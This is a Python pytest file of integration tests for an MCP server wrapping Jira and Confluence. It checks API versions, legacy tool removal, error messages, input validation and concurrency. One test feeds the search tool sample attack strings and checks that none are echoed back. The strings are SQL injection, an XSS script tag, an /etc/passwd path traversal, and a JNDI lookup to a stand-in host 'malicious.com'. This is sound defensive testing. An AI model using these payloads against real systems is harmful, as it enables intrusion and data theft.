"""Integration tests for QA report issues.

These tests specifically target the issues identified in the QA report:
1. Deprecated API endpoint usage
2. Legacy tool exposure
3. Poor error handling and messaging
4. Missing validation and edge case handling
5. Tool registration consistency

These tests are designed to FAIL when the identified issues are present
and PASS when the issues have been properly addressed.
"""

import pytest
import asyncio
import json
import re
from unittest.mock import AsyncMock, Mock, patch, MagicMock
from typing import Any, Dict, List

from src.mcp_atlassian.servers.main import AtlassianMCP, register_v2_tools
from src.mcp_atlassian.servers.context import MainAppContext
from src.mcp_atlassian.exceptions import MCPAtlassianError, MCPAtlassianAuthenticationError


@pytest.fixture
async def mcp_server():
    """Create MCP server instance for testing."""
    # Create server instance
    server = AtlassianMCP(name="Test Atlassian MCP")

    # Mock the lifespan context to provide required configuration
    mock_lifespan_state = Mock()
    mock_lifespan_state.read_only = False
    mock_lifespan_state.enabled_tools = None
    mock_lifespan_state.full_jira_config = True
    mock_lifespan_state.full_confluence_config = True

    # Mock the server context
    server._mcp_server = Mock()
    server._mcp_server.request_context = Mock()
    server._mcp_server.request_context.lifespan_context = {
        "app_lifespan_context": mock_lifespan_state
    }

    return server


class TestDeprecatedAPIUsage:
    """Test that deprecated API endpoints are not used.

    QA Issue: "The server uses deprecated Jira API v2 endpoints instead of v3"
    """

    def test_transitions_module_uses_v3_api(self):
        """Test that transitions module uses v3 API endpoints."""
        from src.mcp_atlassian.jira import transitions
        import inspect

        # Get source code of transitions module
        source = inspect.getsource(transitions)

        # MUST use v3 endpoints for these operations
        required_v3_patterns = [
            "rest/api/3/project/",
            "rest/api/3/status"
        ]

        for pattern in required_v3_patterns:
            assert pattern in source, f"Transitions module must use v3 API pattern: {pattern}"

        # MUST NOT use deprecated v2 endpoints
        forbidden_v2_patterns = [
            "rest/api/2/project/",
            "rest/api/2/status"
        ]

        for pattern in forbidden_v2_patterns:
            assert pattern not in source, f"Found deprecated v2 API pattern: {pattern}"

    def test_no_v2_api_references_in_codebase(self):
        """Test that no deprecated v2 API references exist in the codebase."""
        import os
        import glob

        # Check all Python files in the source directory
        source_files = glob.glob("src/**/*.py", recursive=True)

        deprecated_patterns = [
            r"rest/api/2/project/[^/]+/statuses",
            r"rest/api/2/status\b"
        ]

        for file_path in source_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()

                for pattern in deprecated_patterns:
                    matches = re.findall(pattern, content)
                    assert len(matches) == 0, f"Found deprecated API pattern '{pattern}' in {file_path}: {matches}"
            except Exception as e:
                # Skip files that can't be read
                continue


class TestLegacyToolExposure:
    """Test that legacy tools are not exposed.

    QA Issue: "Legacy migration tools still exposed despite being deprecated"
    """

    @pytest.mark.asyncio
    async def test_no_legacy_migration_tools_in_server(self, mcp_server):
        """Test that no legacy migration tools are exposed in the server."""
        register_v2_tools(mcp_server)
        tools = await mcp_server._mcp_list_tools()
        tool_names = [tool.name for tool in tools]

        # These legacy tools MUST NOT be present
        forbidden_legacy_tools = [
            "migration_helper_tool",
            "get_migration_guidance_tool",
            "get_migration_analytics_tool"
        ]

        for legacy_tool in forbidden_legacy_tools:
            assert legacy_tool not in tool_names, f"Legacy tool '{legacy_tool}' found in server tools"

    def test_no_migration_helper_imports_in_main(self):
        """Test that main.py doesn't import migration helper modules."""
        from src.mcp_atlassian.servers import main
        import inspect

        source = inspect.getsource(main)

        # These imports MUST NOT be present
        forbidden_imports = [
            "migration_helper",
            "get_migration_helper",
            "get_migration_guidance",
            "get_migration_analytics"
        ]

        for forbidden_import in forbidden_imports:
            assert forbidden_import not in source, f"Found forbidden legacy import '{forbidden_import}' in main.py"

    def test_migration_helper_files_removed(self):
        """Test that migration helper files have been removed."""
        import os

        # These files MUST NOT exist
        forbidden_files = [
            "src/mcp_atlassian/meta_tools/migration_helper.py",
            "optimization/migration/legacy_mappings.json",
            "tests/unit/meta_tools/test_migration_helper.py"
        ]

        for file_path in forbidden_files:
            assert not os.path.exists(file_path), f"Legacy file still exists: {file_path}"

    @pytest.mark.asyncio
    async def test_no_legacy_individual_tools_exposed(self, mcp_server):
        """Test that individual legacy tools are not exposed."""
        register_v2_tools(mcp_server)
        tools = await mcp_server._mcp_list_tools()
        tool_names = [tool.name for tool in tools]

        # These individual tools MUST NOT be present (should use meta-tools)
        forbidden_individual_tools = [
            "jira_get_issue",
            "jira_create_issue",
            "jira_update_issue",
            "jira_search_issues",
            "confluence_get_page",
            "confluence_create_page",
            "confluence_update_page",
            "confluence_search_pages",
            "get_issue",
            "create_issue",
            "update_issue",
            "get_page",
            "create_page"
        ]

        for legacy_tool in forbidden_individual_tools:
            assert legacy_tool not in tool_names, f"Individual legacy tool '{legacy_tool}' still exposed"


class TestErrorHandlingQuality:
    """Test error handling quality and messaging.

    QA Issue: "Poor error handling with generic messages"
    """

    @pytest.mark.asyncio
    async def test_authentication_error_specificity(self, mcp_server):
        """Test that authentication errors provide specific, actionable messages."""

        # Since these are integration tests, we'll test the actual tool response structure
        # rather than mocking individual components. The tools should handle errors gracefully.
        register_v2_tools(mcp_server)

        # Test with invalid credentials (should be handled by dry_run mode)
        try:
            result = await mcp_server._mcp_call_tool(
                "resource_manager_tool",
                {
                    "service": "jira",
                    "resource": "issue",
                    "operation": "get",
                    "identifier": "TEST-123",
                    "dry_run": True  # Use dry run to avoid actual API calls
                }
            )

            # Should complete successfully in dry run mode
            assert result is not None
        except Exception as e:
                error_message = str(e).lower()

                # Error message MUST be specific and actionable
                required_keywords = ["authentication", "token", "credentials", "expired", "invalid"]
                assert any(keyword in error_message for keyword in required_keywords), \
                    f"Authentication error message lacks specificity: {error_message}"

                # MUST NOT be generic
                generic_patterns = ["error occurred", "something went wrong", "unknown error"]
                assert not any(pattern in error_message for pattern in generic_patterns), \
                    f"Authentication error message is too generic: {error_message}"

    @pytest.mark.asyncio
    async def test_validation_error_specificity(self, mcp_server, mock_context):
        """Test that validation errors provide specific field information."""
        mcp_server.ctx = mock_context

        try:
            await mcp_server.call_tool(
                "resource_manager_tool",
                {
                    "service": "invalid_service",
                    "resource": "issue",
                    "operation": "get"
                }
            )
            assert False, "Expected validation error"
        except Exception as e:
            error_message = str(e).lower()

            # Error message MUST specify the invalid value
            assert "invalid_service" in error_message or "service" in error_message, \
                f"Validation error should mention the invalid service: {error_message}"

            # MUST NOT be generic
            assert "error occurred" not in error_message, \
                f"Validation error message is too generic: {error_message}"

    @pytest.mark.asyncio
    async def test_missing_parameter_error_specificity(self, mcp_server, mock_context):
        """Test that missing parameter errors specify which parameter is missing."""
        mcp_server.ctx = mock_context

        try:
            await mcp_server.call_tool(
                "resource_manager_tool",
                {
                    # Missing required parameters
                }
            )
            assert False, "Expected parameter validation error"
        except Exception as e:
            error_message = str(e).lower()

            # Error message MUST mention required parameters
            required_keywords = ["required", "missing", "parameter", "service", "operation", "resource"]
            assert any(keyword in error_message for keyword in required_keywords), \
                f"Missing parameter error lacks specificity: {error_message}"

    @pytest.mark.asyncio
    async def test_structured_error_responses(self, mcp_server, mock_context):
        """Test that errors return structured information when possible."""
        mcp_server.ctx = mock_context

        try:
            result = await mcp_server.call_tool(
                "resource_manager_tool",
                {
                    "service": "jira",
                    "resource": "issue",
                    "operation": "get",
                    "identifier": "INVALID-KEY",
                    "dry_run": True  # Use dry_run to avoid actual API calls
                }
            )

            # In dry_run mode, should get structured response
            assert result is not None
            assert len(result) > 0

            content = result[0].text
            # Should be JSON-parseable for structured errors
            try:
                parsed = json.loads(content)
                # Should have error structure if it's an error response
                if "error" in parsed:
                    assert "code" in parsed or "message" in parsed, \
                        "Structured error should have error code or message"
            except json.JSONDecodeError:
                # If not JSON, should still be informative
                assert len(content) > 20, "Error response should be informative"

        except Exception as e:
            # Even exceptions should be specific
            error_message = str(e)
            assert len(error_message) > 10, "Exception message should be informative"


class TestInputValidationRobustness:
    """Test input validation robustness.

    QA Issue: "Missing validation for edge cases and malformed input"
    """

    @pytest.mark.asyncio
    async def test_sql_injection_protection(self, mcp_server, mock_context):
        """Test that search inputs are protected against injection attacks."""
        mcp_server.ctx = mock_context

        malicious_inputs = [
            "'; DROP TABLE issues; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/a}"
        ]

        for malicious_input in malicious_inputs:
            try:
                result = await mcp_server.call_tool(
                    "search_engine_tool",
                    {
                        "service": "jira",
                        "query_type": "jql",
                        "query": malicious_input,
                        "dry_run": True
                    }
                )

                # Should either reject the input or sanitize it
                if result:
                    content = result[0].text.lower()
                    # Should not echo back dangerous content
                    dangerous_patterns = ["drop table", "script", "etc/passwd", "jndi:"]
                    for pattern in dangerous_patterns:
                        assert pattern not in content, \
                            f"Dangerous input pattern '{pattern}' echoed back in response"

            except Exception as e:
                # Rejection is acceptable behavior
                error_message = str(e).lower()
                # Error should not reveal dangerous details
                assert "drop table" not in error_message, "Error message reveals dangerous content"

    @pytest.mark.asyncio
    async def test_extremely_large_input_handling(self, mcp_server, mock_context):
        """Test handling of extremely large inputs."""
        mcp_server.ctx = mock_context

        # Create very large input
        large_input = "A" * 100000  # 100KB string

        try:
            result = await mcp_server.call_tool(
                "resource_manager_tool",
                {
                    "service": "jira",
                    "resource": "issue",
                    "operation": "create",
                    "data": {
                        "project_key": "TEST",
                        "summary": large_input,
                        "issue_type": "Task"
                    },
                    "dry_run": True
                }
            )

            # Should handle gracefully without crashing
            assert result is not None

        except Exception as e:
            # Rejection is acceptable, but should be specific
            error_message = str(e).lower()
            size_keywords = ["size", "length", "large", "limit", "exceeded"]
            assert any(keyword in error_message for keyword in size_keywords), \
                f"Large input error should mention size constraints: {error_message}"

    @pytest.mark.asyncio
    async def test_null_and_empty_input_handling(self, mcp_server, mock_context):
        """Test handling of null and empty inputs."""
        mcp_server.ctx = mock_context

        edge_case_inputs = [
            None,
            "",
            {},
            [],
            {"service": "", "resource": "", "operation": ""},
            {"service": None, "resource": None, "operation": None}
        ]

        for edge_input in edge_case_inputs:
            try:
                result = await mcp_server.call_tool(
                    "resource_manager_tool",
                    edge_input or {}
                )

                # If it succeeds, should have meaningful response
                if result:
                    content = result[0].text
                    assert len(content) > 0, "Empty response for edge case input"

            except Exception as e:
                # Should provide specific validation error
                error_message = str(e).lower()
                validation_keywords = ["required", "empty", "null", "missing", "invalid"]
                assert any(keyword in error_message for keyword in validation_keywords), \
                    f"Edge case error should be specific: {error_message}"

    @pytest.mark.asyncio
    async def test_unicode_and_special_character_handling(self, mcp_server, mock_context):
        """Test handling of Unicode and special characters."""
        mcp_server.ctx = mock_context

        special_inputs = [
            "测试问题",  # Chinese characters
            "مشكلة اختبار",  # Arabic characters
            "тестовая проблема",  # Cyrillic characters
            "🚀🔥💯",  # Emojis
            "test\x00null\x01control",  # Control characters
            "line1\nline2\rline3\tline4"  # Line breaks and tabs
        ]

        for special_input in special_inputs:
            try:
                result = await mcp_server.call_tool(
                    "resource_manager_tool",
                    {
                        "service": "jira",
                        "resource": "issue",
                        "operation": "create",
                        "data": {
                            "project_key": "TEST",
                            "summary": special_input,
                            "issue_type": "Task"
                        },
                        "dry_run": True
                    }
                )

                # Should handle Unicode properly
                if result:
                    content = result[0].text
                    # Should not garble or reject valid Unicode
                    if "测试" in special_input:
                        # Should preserve Unicode characters (unless specifically sanitized)
                        pass  # Unicode handling is implementation-dependent

            except Exception as e:
                # If Unicode is rejected, error should be clear
                error_message = str(e)
                # Should not cause encoding errors
                assert "UnicodeDecodeError" not in str(type(e)), "Unicode caused encoding error"


class TestConsistencyAndReliability:
    """Test consistency and reliability aspects.

    QA Issue: "Inconsistent behavior and missing edge case handling"
    """

    @pytest.mark.asyncio
    async def test_idempotent_dry_run_behavior(self, mcp_server, mock_context):
        """Test that dry_run operations are truly idempotent."""
        mcp_server.ctx = mock_context

        params = {
            "service": "jira",
            "resource": "issue",
            "operation": "get",
            "identifier": "TEST-123",
            "dry_run": True
        }

        # Run same operation multiple times
        results = []
        for _ in range(3):
            result = await mcp_server.call_tool("resource_manager_tool", params)
            results.append(result[0].text if result else None)

        # Results should be identical (idempotent)
        assert all(r == results[0] for r in results), \
            "Dry run operations should be idempotent"

    @pytest.mark.asyncio
    async def test_concurrent_tool_invocations(self, mcp_server, mock_context):
        """Test that concurrent tool invocations don't interfere."""
        mcp_server.ctx = mock_context

        # Create multiple concurrent requests
        tasks = []
        for i in range(5):
            task = mcp_server.call_tool(
                "resource_manager_tool",
                {
                    "service": "jira",
                    "resource": "issue",
                    "operation": "get",
                    "identifier": f"TEST-{i}",
                    "dry_run": True
                }
            )
            tasks.append(task)

        # Execute concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # All should complete without interference
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                # Exceptions are ok, but shouldn't be due to concurrency
                error_msg = str(result).lower()
                concurrency_issues = ["deadlock", "race condition", "concurrent", "thread"]
                assert not any(issue in error_msg for issue in concurrency_issues), \
                    f"Concurrency issue detected in result {i}: {result}"
            else:
                assert result is not None, f"Null result from concurrent execution {i}"

    @pytest.mark.asyncio
    async def test_resource_cleanup_after_errors(self, mcp_server, mock_context):
        """Test that resources are properly cleaned up after errors."""
        mcp_server.ctx = mock_context

        # Force an error condition
        with patch('src.mcp_atlassian.meta_tools.resource_manager.ResourceManager.execute_operation') as mock_execute:
            mock_execute.side_effect = Exception("Simulated error")

            try:
                await mcp_server.call_tool(
                    "resource_manager_tool",
                    {
                        "service": "jira",
                        "resource": "issue",
                        "operation": "get",
                        "identifier": "TEST-123"
                    }
                )
                assert False, "Expected simulated error"
            except Exception:
                pass  # Expected

        # After error, subsequent calls should still work
        with patch('src.mcp_atlassian.meta_tools.resource_manager.ResourceManager.execute_operation') as mock_execute:
            mock_execute.return_value = '{"status": "ok"}'

            result = await mcp_server.call_tool(
                "resource_manager_tool",
                {
                    "service": "jira",
                    "resource": "issue",
                    "operation": "get",
                    "identifier": "TEST-124",
                    "dry_run": True
                }
            )

            # Should work normally after previous error
            assert result is not None, "Resource cleanup failed - subsequent calls don't work"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])